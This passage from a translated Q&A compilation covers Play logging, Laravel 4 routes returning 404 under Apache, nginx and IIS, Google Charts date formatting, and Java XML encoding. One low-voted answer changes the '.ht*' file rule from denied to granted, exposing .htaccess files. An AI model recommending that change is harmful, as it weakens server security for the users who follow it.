2012-11-22 19:05:43,920 - [INFO] - from play 
Application started (Dev)

2012-11-22 19:05:44,127 - [ERROR] - from test.Application 
**** error enabled ***** 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-23T12:44:31.333

尝试使用记录器名称而不是类名称

```
ALogger log = play.Logger.of("application"); 
```

这很好用。还要注释掉文件中提到日志级别的行`application.conf`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-01-30T11:54:28.363

我坚持同样的问题，它也没有打印我的日志的实际行号和类名，经过长时间的搜索，我在 git-hub 上找到了这个[项目](https://github.com/studiodev/play2-log-subproject)`sl4j`，并尝试了下面的记录器，它可以工作。

**控制器**

```
private static final org.slf4j.Logger logger = org.slf4j.LoggerFactory.getLogger("controller"); 
```

**记录器.xml**

`<logger name="controller" level="DEBUG" />`

最后注释掉所有的日志级别`application.conf`。

# laravel - Laravel 4除首页外的所有路由都导致404错误

> ID：13514990
> 
> 赞同：70
> 
> 时间：2012-11-22T14:39:04.720
> 
> 标签：laravel, laravel-4, routing, http-status-code-404, laravel-routing

我使用 Composer 安装了 Laravel 4 并设置了一个虚拟主机。目前，只有根路由有效：

```
<?php

Route::get('/', function()
{
    return View::make('hello');
}); 
```

这不是：

```
Route::get('/hello', function()
{
    return View::make('hello');
}); 
```

我要打的`TasksController`是`/tasks`：

```
Route::resource('tasks', 'TasksController'); 
```

这也给了我 404 错误。我可能做错了什么？我在项目的根目录中有一个默认的 .htaccess 文件：

```
<IfModule mod_rewrite.c>
    Options -MultiViews
    RewriteEngine On
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteRule ^ index.php [L]
</IfModule> 
```

我在 Mac 上使用 localhost。

* * *

## 回答 #1

> 赞同：112
> 
> 时间：2012-11-22T14:54:41.703

Just for a laugh, see if `/index.php/hello` works.

If so, then most likely it's a `.htaccess` problem.

* * *

## 回答 #2

> 赞同：40
> 
> 时间：2013-05-31T19:04:27.133

在 WAMP（Windows 8）上运行 Laravel 4 时遇到了同样的问题。
对我有用的解决方案是：

1.  打开 apache httpd.conf 并找到这一行：

    ```
    #LoadModule rewrite_module modules/mod_rewrite.so 
    ```

2.  取消注释此行（删除`#`）
3.  节省`httpd.conf`
4.  重启 WAMP

它应该工作！

* * *

## 回答 #3

> 赞同：30
> 
> 时间：2014-10-22T12:35:38.830

我有同样的问题，解决方案是在 Apache2 上启用重写模块

在终端中使用以下命令：

```
$ sudo a2enmod rewrite
$ sudo service apache2 restart 
```

还有魔法！

* * *

## 回答 #4

> 赞同：18
> 
> 时间：2015-01-17T11:22:58.607

有完全相同的问题。

我需要做两件事来解决这个问题：

1.  在 Apache 中启用**rewrite_module**
2.  **将AllowOverride**从 None更改为**All**，例如（Apache 2.4.9）：

    ```
    <Directory "c:/www">
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        Require all granted
    </Directory> 
    ```

仅供参考：
将 Laravel Homestead 与 VirtualBox 和 Vagrant 一起使用，而不是 WAMP。它包含 Nginx 而不是 Apache，但默认情况下一切正常，因为它是为 Laravel 明确配置的。

* * *

## 回答 #5

> 赞同：16
> 
> 时间：2018-08-28T01:30:21.527

**为 UBUNTU 用户**- 为 Ubuntu 18.04 测试

1-启用模组重写

```
sudo a2enmod rewrite 
```

2-更改 apache conf 文件中的 AllowOverride：

```
sudo nano /etc/apache2/apache2.conf 
```

在此块中将 AllowOverride 从 None 更改为 All

```
<Directory /var/www/>
    Options Indexes FollowSymLinks
    AllowOverride All
    Require all granted
</Directory> 
```

3-重新启动Apache

```
sudo service apache2 restart 
```

* * *

## 回答 #6

> 赞同：12
> 
> 时间：2013-09-14T02:01:11.850

即使在启用 mod_rewrite 之后，如果您为 laravel/public 文件夹设置别名，您也可能会遇到此问题。

添加

```
RewriteBase /your_apache_alias 
```

到 .htaccess 就可以了。

* * *

## 回答 #7

> 赞同：8
> 
> 时间：2015-03-08T06:32:15.560

我尝试了所有这些都没有成功，然后我找到了另一个帖子并将我的 .htaccess 更改为：

```
<IfModule mod_rewrite.c>
Options -MultiViews
RewriteEngine On

RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^ /index.php [L]
</IfModule> 
```

* * *

## 回答 #8

> 赞同：6
> 
> 时间：2012-11-22T14:45:22.977

在定义 home 以外的任何内容时，您不需要 / ：

```
Route::get('hello', function()
{
    return View::make('hello');
}); 
```

应该管用。

* * *

## 回答 #9

> 赞同：5
> 
> 时间：2014-11-13T12:49:06.883

就像@GaryJ 和@MartinGomez 所说。这是**.htaccess**的内容，应该为在 Apache 服务器上运行的所有 laravel 4 项目的**public文件夹设置：**

```
<IfModule mod_rewrite.c>
    <IfModule mod_negotiation.c>
        Options -MultiViews
    </IfModule>

    RewriteEngine On
    RewriteBase /

    # Redirect Trailing Slashes...
    RewriteRule ^(.*)/$ /$1 [L,R=301]

    # Handle Front Controller...
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteRule ^ index.php [L]
</IfModule> 
```

* * *

## 回答 #10

> 赞同：4
> 
> 时间：2012-11-24T14:47:14.507

由于 Laravel 4 是从静态文件中的地图自动加载文件，因此您需要在添加新控制器时更新该文件。运行以下命令重建静态文件：

```
php composer.phar dump-autoload 
```

* * *

## 回答 #11

> 赞同：4
> 
> 时间：2015-01-15T14:02:07.157

之前的回答有一点小瑕疵。这可能会有所帮助。

```
$ sudo a2enmod rewrite
$ sudo service apache2 restart 
```

希望确实如此。

* * *

## 回答 #12

> 赞同：3
> 
> 时间：2015-01-28T07:15:59.873

很明显，问题是由于“mod_rewrite”而出现的，在某些情况下，只需在 Apache 中启用此模块就足以修复它。

但是，就我而言，我必须通过以下方式扩展 VirtualHost 的配置：

```
<VirtualHost *:80>

    ServerName adplus.local

    ServerAdmin sergey.donchenko@gmail.com
    DocumentRoot /var/www/adplus.local/project/public

    **<Directory "/var/www/adplus.local/project/public">
        AllowOverride All
    </Directory>**

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost> 
```

* * *

## 回答 #13

> 赞同：3
> 
> 时间：2014-08-02T06:57:10.563

我遇到了这个问题（在手动安装 Apache 2.2 的 Windows 上），原因是`AllowOverride`我的 VirtualHost 中缺少，因为 httpd.conf 中的根目录默认为 None。

`FileInfo Options=MultiViews`是 Laravel 的 .htaccess 所需的最小集合

例如

```
<VirtualHost *:80>
    DocumentRoot "C:/htdocs/domain.com/laravel/public"
    ServerName foo.domain.com

    <Directory "C:/htdocs/domain.com/laravel/public">
        AllowOverride FileInfo Options=MultiViews
    </Directory>
</VirtualHost> 
```

或者`AllowOverride All`如果这不起作用并且您不关心安全性，请使用。

* * *

## 回答 #14

> 赞同：2
> 
> 时间：2016-12-23T15:04:04.153

去

> 纳米 /etc/nginx/sites-available/yoursite

找到 try_file 并替换如下：

`try_files $uri $uri/ /index.php?$query_string;`

* * *

## 回答 #15

> 赞同：2
> 
> 时间：2016-12-21T13:38:18.400

对于 Nginx 用户，您可能复制了`default`虚拟主机 - 但 Laravel 需要对`location`指令进行一些自定义，以允许 Laravel 应用程序而不是 Nginx 进行路由。

在你`/etc/nginx/sites-available/your-site-name`用这个替换位置指令：

```
location / {
    try_files $uri $uri/ /index.php$is_args$args;
} 
```

然后运行`sudo service nginx reload`以使更改生效。

* * *

## 回答 #16

> 赞同：1
> 
> 时间：2017-08-27T14:51:52.430

我在带有 Lumen 5.4 的 Ubuntu 14.04 上遇到了类似的问题。

解决方案对我来说是两部分。首先在我的 vhost 文件`/etc/apache2/sites-enabled/my_vhost.conf`中，我必须在声明我的之后添加以下`<Directory>`条目以允许覆盖`DocumentRoot`：

```
 DocumentRoot /var/www/path/to/my/app/public

    <Directory "/var/www/path/to/my/app/public">
            Options FollowSymLinks
            AllowOverride All

            Order allow,deny
            Allow from all
    </Directory> 
```

接下来，我必须启用重写：

```
sudo a2enmod rewrite
sudo service apache2 restart 
```

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2015-01-15T02:08:07.513

此更新对我有用。在 .htaccess 文件中，只需在打开 Rewriterules 后添加以下内容。

```
Options -Indexes
Options +FollowSymLinks 
```

像魅力一样工作

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2021-10-17T19:26:17.940

如果使用 IIS 作为 Web 服务器，请在 public 文件夹或 index.php 使用此配置的位置创建一个名为 web.config 的文件：

```
<configuration>
    <system.webServer>
        <rewrite>
            <rules>
                <rule name="Imported Rule 1" stopProcessing="true">
                    <match url="^" ignoreCase="false" />
                    <conditions logicalGrouping="MatchAll">
                        <add input="{REQUEST_FILENAME}" matchType="IsDirectory" ignoreCase="false" negate="true" />
                        <add input="{REQUEST_FILENAME}" matchType="IsFile" ignoreCase="false" negate="true" />
                    </conditions>
                    <action type="Rewrite" url="index.php" />
                </rule>
            </rules>
        </rewrite>
    </system.webServer>
</configuration> 
```

如果您使用 apache 编辑 .htaccess 文件并添加此部分

```
<Directory />
    AllowOverride All
</Directory> 
```

在linux和nginx中没有这个问题

* * *

## 回答 #19

> 赞同：-1
> 
> 时间：2016-09-13T22:45:55.430

此评论可能有点晚，但可能会有所帮助。像这样路由到另一个视图时，我遇到了同样的问题：

```
Route::get('index', function () {
return view('index');
});

Route::get('login', function () {
return view('login');
}); 
```

但是没有用，所以我尝试了在所有相关帖子中找到的所有内容，但还不足以解决我的问题，所以我在 httpd.conf 上找到了以下几行：

```
<Files ".ht*">
Require all denied
</Files> 
```

所以我将“拒绝”更改为“授予”，并在我的 .htaccess 中评论了这一行：

```
#RewriteBase / 
```

并工作！我认为这些行使 Apache 不考虑您项目的 .htaccess 文件，因此将其设置为授予会有所不同。希望这可以帮助有同样问题的人。

在 Apache Server 2 @ Manjaro Linux 上工作（基于 Archlinux）

# javascript - Google Charts - 工具提示文本回调

> ID：13514994
> 
> 赞同：0
> 
> 时间：2012-11-22T14:39:12.677
> 
> 标签：javascript, tooltip, google-visualization

我有一些带有非常大数据集的图表，实际上如此之大，以至于当我尝试添加会在本地时区中以人类可读格式而不是 utc 纪元整数值播放时间的工具提示文本时，脚本只是时间出来，浏览器变得无响应。

理想情况下，我想保留大型数据集，因为它比能够以正常格式而不是纪元读取时间更重要。是否可以让谷歌图表触发回调函数以动态生成工具提示文本值，而不是在图表显示之前加载所有这些值？

如果有人想知道，我将 utc 纪元转换为工具提示文本的代码如下：

```
var utcSeconds = value;
var dateObj = new Date(0);
dateObj.setUTCSeconds(utcSeconds);

// dateObj is now a date in the users local time zone
var readableTimestamp = " " + dateObj.getHours() + ":" + 
                        dateObj.getMinutes() + ":" + 
                        dateObj.getSeconds() + " " +
                        dateObj.getDate() + " " + 
                        dateObj.getMonth() + " " +
                        dateObj.getFullYear(); 
```

任何提示/建议表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T15:11:09.007

只使用谷歌“格式化程序”并将第一列从数字格式更改为日期格式并输入日期对象而不是纪元整数要快得多。

格式化代码如下：

```
value = Number(value);
var utcEpoch = index;
index = new Date(0);
index.setUTCSeconds(utcEpoch);
googleTable.addRows([[index, value]]); 

...
...

var formatter = new google.visualization.DateFormat({pattern: "dd MMMM yyyy HH:MM:ss"});
// Reformat our data.
formatter.format(googleTable, 0); 
```

不过，我仍然想知道您是否可以运行回调。

# java - 使用 encoding="ISO-8859-1" 的新文件拆分 XML 文件

> ID：13514996
> 
> 赞同：1
> 
> 时间：2012-11-22T14:39:16.073
> 
> 标签：java, xml

我有一个程序来获取一个大的 xml 文件并对其进行验证，然后将其拆分为较小的文件。我遇到的问题是新文件的编码是 UTF-8 。我需要它们在 ISO-8859-1

这里是代码

```
public class SplitMain {

public static void main(String [] args) throws Exception {
    validateInputFile("D:/sanket/cms_dev/XmlSplitSample/src/inputFile/");
    File input = new File("D:/sanket/cms_dev/XmlSplitSample/src/inputFile/sample.xml");
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    Document doc = dbf.newDocumentBuilder().parse(input);
    XPath xpath = XPathFactory.newInstance().newXPath();

    NodeList nodes = (NodeList) xpath.evaluate("//DataFile/Contact", doc, XPathConstants.NODESET);

    int itemsPerFile = 5;
    int fileNumber = 0;
    Document currentDoc = dbf.newDocumentBuilder().newDocument();
    Node rootNode = currentDoc.createElement("DataFile");
    File currentFile = new File("nufile"+fileNumber+".xml");
    for (int i=1; i <= nodes.getLength(); i++) {
        Node imported = currentDoc.importNode(nodes.item(i-1), true);
        rootNode.appendChild(imported);

        if (i % itemsPerFile == 0) {
            writeToFile(rootNode, currentFile);

            rootNode = currentDoc.createElement("DataFile");
            currentFile = new File("nufile"+(++fileNumber)+".xml");
            System.out.println(currentFile);
        }
    }

    writeToFile(rootNode, currentFile);
}

private static void writeToFile(Node node, File file) throws Exception {
    Transformer transformer = TransformerFactory.newInstance().newTransformer();
    transformer.transform(new DOMSource(node), new StreamResult(new FileWriter(file)));
}
private static void validateInputFile(String WORK_DIRECTORY)
{
    //String workingDir=config.getProperty(WORK_DIRECTORY);//comment for automating the process

    String workingDir=WORK_DIRECTORY;//added for automating the process

    String finalString = null;
    File folder = new File(workingDir);

    if (folder.isFile())
    {
        System.out.println("watever");
        return ;
    }

    String[] fileNameArray = folder.list();
    String xmlExtension=".xml";
    for (String fileName : fileNameArray) {

            try{
                //XMLtoString
                BufferedReader br = new BufferedReader(new FileReader(new File(workingDir + "/" +fileName))); 
                String line;
                StringBuilder stringBuilder = new StringBuilder();
                while((line=br.readLine())!= null)
                {
                    stringBuilder.append(line.trim()); 
                } 
                finalString = stringBuilder.toString();
                StringBuilder sb = new StringBuilder();

                if(finalString == null)
                    return;
               System.out.println(finalString);
                for(int i=0;i<finalString.length();i++)
                {
                   if (finalString.charAt(i) == '&')
                    {
                       sb.append("&amp;");

                    }
                    else
                    {
                        sb.append(finalString.charAt(i));
                    }
                }
                finalString=sb.toString();

                //StringToXML

                DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();   
                System.out.println(finalString);
                DocumentBuilder builder=factory.newDocumentBuilder();
                Document document = builder.parse( new InputSource(new StringReader( finalString ) ) ); 
                TransformerFactory tranFactory = TransformerFactory.newInstance();   
                Transformer aTransformer = tranFactory.newTransformer(); 
                Source src = new DOMSource(document); 
                Result dest = new StreamResult( new File( workingDir + "/" +fileName) );
                aTransformer.transform( src, dest ); 

            }
                catch (Exception e) {
                e.printStackTrace();
                }

    }
} 
```

}

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-22T14:43:03.103

您需要指定 Transformer 编码，例如：

```
transformer.setOutputProperty(OutputKeys.ENCODING, "ISO-8859-1"); 
```

然后使用流写出（如果您使用写入器，它将通过另一个不需要的编码层）